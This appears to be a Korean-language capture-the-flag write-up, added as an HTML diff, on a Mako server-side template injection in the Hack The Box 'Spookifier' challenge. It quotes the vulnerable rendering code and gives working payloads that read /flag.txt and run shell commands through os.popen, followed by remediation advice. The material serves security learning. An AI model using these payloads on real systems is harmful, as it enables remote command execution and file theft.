@@ -1,0 +1,191 @@
+<h1 id="section-1">HTB Spookifier 라이트업 - SSTI (Mako Template)</h1>
+<h2 id="section-2">1. 개요</h2>
+<p>Hack The Box Web Challenge <code>Spookifier</code>는 사용자가 입력한 이름을 여러 형태의 spooky font로 변환해 보여주는 웹 애플리케이션이다. 입력값이 서버 측 템플릿에 안전하지 않게 삽입되어 Server-Side Template Injection(SSTI)이 발생한다.</p>
+<p>초기 로드맵에는 Jinja2 기반 SSTI로 적어두었지만, Spookifier는 Flask 애플리케이션에서 Mako 템플릿을 사용하는 케이스로 정리하는 것이 정확하다. 이 보고서는 템플릿 엔진 식별, 입력 반영 위치 확인, Mako 문법 기반 SSTI 검증, 파일 읽기 영향도까지의 흐름을 정리한다.</p>
+<h2 id="section-3">2. 대상 / 환경</h2>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>항목</th>
+<th>내용</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>플랫폼</td>
+<td>Hack The Box Web Challenge</td>
+</tr>
+<tr>
+<td>대상</td>
+<td>Spookifier</td>
+</tr>
+<tr>
+<td>취약 유형</td>
+<td>Server-Side Template Injection</td>
+</tr>
+<tr>
+<td>프레임워크</td>
+<td>Flask</td>
+</tr>
+<tr>
+<td>템플릿 엔진</td>
+<td>Mako</td>
+</tr>
+<tr>
+<td>주요 입력</td>
+<td><code>GET /?text=&lt;user_input&gt;</code></td>
+</tr>
+<tr>
+<td>목표</td>
+<td>템플릿 주입을 통한 서버 측 표현식 실행 및 민감 파일 읽기</td>
+</tr>
+</tbody></table></div>
+<h2 id="section-4">3. 분석 목적</h2>
+<ul>
+<li>사용자 입력이 서버 측 템플릿에 삽입되는 지점을 식별한다.</li>
+<li>Jinja2와 Mako의 SSTI 문법 차이를 구분한다.</li>
+<li>단순 반영, XSS, SSTI를 단계적으로 분리해 판단한다.</li>
+<li>템플릿 엔진 권한으로 파일 읽기 또는 명령 실행이 가능한지 확인한다.</li>
+<li>개발 관점의 대응 방안을 정리한다.</li>
+</ul>
+<h2 id="section-5">4. 정찰 및 입력 지점 확인</h2>
+<p>애플리케이션은 이름 입력 폼을 제공하고, 제출된 값을 여러 글꼴 형태로 변환해 화면에 출력한다.</p>
+<pre><code class="language-text">GET /?text=guest
+</code></pre>
+<p>입력값이 응답 HTML에 반영되므로 먼저 다음 항목을 확인한다.</p>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>점검 항목</th>
+<th>확인 관점</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>반영 위치</td>
+<td>입력값이 HTML 본문, 속성, 템플릿 결과 중 어디에 나타나는가</td>
+</tr>
+<tr>
+<td>처리 위치</td>
+<td>클라이언트 JavaScript 처리인지, 서버 렌더링인지</td>
+</tr>
+<tr>
+<td>특수문자 처리</td>
+<td><code>&lt;</code>, <code>&gt;</code>, <code>{</code>, <code>}</code>, <code>$</code> 같은 문자가 보존되는가</td>
+</tr>
+<tr>
+<td>템플릿 흔적</td>
+<td>Flask, Werkzeug, Mako, Jinja2 같은 프레임워크/엔진 단서</td>
+</tr>
+</tbody></table></div>
+<h2 id="section-6">5. 취약 코드 흐름</h2>
+<p>Spookifier의 핵심 문제는 변환된 문자열을 안전한 데이터로 다루지 않고, 문자열 포맷팅 후 다시 템플릿으로 렌더링하는 구조다.</p>
+<pre><code class="language-python">def generate_render(converted_fonts):
+    result = """
+        &lt;tr&gt;
+            &lt;td&gt;{0}&lt;/td&gt;
+        &lt;/tr&gt;
+        &lt;tr&gt;
+            &lt;td&gt;{1}&lt;/td&gt;
+        &lt;/tr&gt;
+        &lt;tr&gt;
+            &lt;td&gt;{2}&lt;/td&gt;
+        &lt;/tr&gt;
+        &lt;tr&gt;
+            &lt;td&gt;{3}&lt;/td&gt;
+        &lt;/tr&gt;
+    """.format(*converted_fonts)
+
+    return Template(result).render()
+</code></pre>
+<p>문제의 핵심은 <code>converted_fonts</code> 안에 사용자 입력이 포함되고, 그 결과 문자열이 Mako <code>Template()</code>에 다시 전달된다는 점이다. 이 경우 입력값이 단순 텍스트가 아니라 템플릿 문법으로 해석될 수 있다.</p>
+<h2 id="section-7">6. SSTI 검증</h2>
+<h3 id="section-8">6.1 Jinja2 문법과 Mako 문법 구분</h3>
+<p>Jinja2에서는 보통 다음과 같은 payload로 산술 표현식 실행 여부를 확인한다.</p>
+<pre><code class="language-text">{{ 7 * 7 }}
+</code></pre>
+<p>하지만 Spookifier는 Mako 기반이므로 <code>${...}</code> 문법을 사용한다.</p>
+<pre><code class="language-text">${7*7}
+</code></pre>
+<p>응답에 <code>49</code>가 포함되면 입력값이 서버 측 템플릿 표현식으로 평가된 것이다.</p>
+<h3 id="section-9">6.2 Mako 표현식 실행 확인</h3>
+<pre><code class="language-text">GET /?text=${7*7}
+</code></pre>
+<p>예상 결과:</p>
+<pre><code class="language-text">49
+</code></pre>
+<p>이 단계에서 XSS와 SSTI를 구분할 수 있다. XSS는 피해자 브라우저에서 JavaScript가 실행되는 문제이고, SSTI는 서버가 템플릿 표현식을 해석해 결과를 응답에 포함하는 문제다.</p>
+<h2 id="section-10">7. 영향도 검증</h2>
+<p>Mako 템플릿에서 Python 객체 접근이 가능하면 서버 파일 읽기 또는 명령 실행으로 이어질 수 있다. CTF 환경에서는 보통 <code>/flag.txt</code> 또는 애플리케이션 상위 경로의 flag 파일을 대상으로 영향도를 확인한다.</p>
+<pre><code class="language-text">${open('/flag.txt').read()}
+</code></pre>
+<p>환경에 따라 직접 <code>open()</code> 접근이 제한되거나 출력 위치가 깨질 수 있으므로, 객체 접근 체인을 통해 <code>os</code> 모듈에 접근하는 방식도 사용된다.</p>
+<pre><code class="language-text">${self.module.cache.util.os.popen('id').read()}
+${self.module.cache.util.os.popen('cat /flag.txt').read()}
+</code></pre>
+<p>제출용 포트폴리오에는 실제 flag 값과 동적 인스턴스 주소를 포함하지 않는다. 대신 파일 읽기 가능성, 서버 명령 실행 가능성, 영향 범위를 중심으로 기록한다.</p>
+<h2 id="section-11">8. 공격 흐름 요약</h2>
+<pre><code class="language-text">1. 이름 입력 기능 확인
+2. text 파라미터가 서버 응답에 반영되는지 확인
+3. 특수문자와 템플릿 문법이 필터링되는지 확인
+4. Jinja2 payload가 아니라 Mako payload(${7*7})로 템플릿 엔진 식별
+5. 산술 표현식 실행으로 SSTI 확정
+6. Python 객체 접근 가능성 확인
+7. /flag.txt 같은 민감 파일 읽기 영향도 검증
+8. 원인과 대응 방안 정리
+</code></pre>
+<h2 id="section-12">9. 영향도</h2>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>구분</th>
+<th>영향</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>기밀성</td>
+<td>서버 파일, 환경 변수, 애플리케이션 설정 노출 가능</td>
+</tr>
+<tr>
+<td>무결성</td>
+<td>템플릿 권한에 따라 서버 상태 변경 또는 명령 실행 가능</td>
+</tr>
+<tr>
+<td>가용성</td>
+<td>무거운 연산 또는 시스템 명령 호출로 서비스 장애 가능</td>
+</tr>
+<tr>
+<td>공격 범위</td>
+<td>인증 없이 입력 가능한 파라미터라면 원격 악용 가능</td>
+</tr>
+<tr>
+<td>위험도</td>
+<td>파일 읽기 또는 명령 실행 가능 시 Critical로 평가 가능</td>
+</tr>
+</tbody></table></div>
+<h2 id="section-13">10. 대응 방안</h2>
+<h3 id="section-14">10.1 사용자 입력을 템플릿으로 재렌더링하지 않기</h3>
+<p>사용자 입력은 템플릿 문법이 아니라 데이터로만 전달해야 한다.</p>
+<pre><code class="language-python">return render_template("index.html", converted_fonts=converted_fonts)
+</code></pre>
+<p>템플릿 문자열을 직접 조립해 <code>Template(result).render()</code>로 실행하는 구조는 피한다.</p>
+<h3 id="section-15">10.2 출력 인코딩 적용</h3>
+<p>HTML에 출력되는 사용자 입력은 HTML 문맥에 맞게 이스케이프한다.</p>
+<pre><code class="language-python">from markupsafe import escape
+
+safe_value = escape(user_input)
+</code></pre>
+<h3 id="section-16">10.3 허용 문자 기반 입력 검증</h3>
+<p>이름 변환 기능처럼 입력 형식이 명확한 경우 허용 문자 기반 검증이 효과적이다.</p>
+<pre><code class="language-text">허용: 영문자, 숫자, 공백, 제한된 길이
+차단: $, {, }, &lt;, &gt;, %, _, (, ), ., / 등 템플릿/객체 접근에 사용되는 문자
+</code></pre>
+<p>단, 입력 검증은 보조 방어책이며 템플릿 재렌더링 제거가 근본 대응이다.</p>
+<h3 id="section-17">10.4 템플릿 엔진 권한 제한</h3>
+<p>템플릿 엔진이 파일 시스템, OS 모듈, Python 내장 객체에 접근하지 못하도록 샌드박스 또는 제한된 렌더링 환경을 사용한다.</p>
+<h2 id="section-18">11. 학습한 점</h2>
+<ul>
+<li>SSTI는 XSS처럼 “화면에 입력이 보이는지”에서 시작하지만, 실제 실행 위치는 브라우저가 아니라 서버다.</li>
+<li>템플릿 엔진마다 문법이 다르므로 <code>{{7*7}}</code> 하나로 끝내지 않고 Jinja2, Mako, Twig, Smarty 문법을 구분해야 한다.</li>
+<li>Spookifier는 Jinja2가 아니라 Mako 문법 <code>${...}</code> 기반으로 접근해야 한다.</li>
+<li>문자열 포맷팅 후 템플릿으로 다시 렌더링하는 구조는 사용자 입력을 코드처럼 해석하게 만들 수 있다.</li>
+<li>보고서에서는 payload보다 “입력값이 템플릿 엔진에 도달하는 구조”를 설명하는 것이 중요하다.</li>
+</ul>
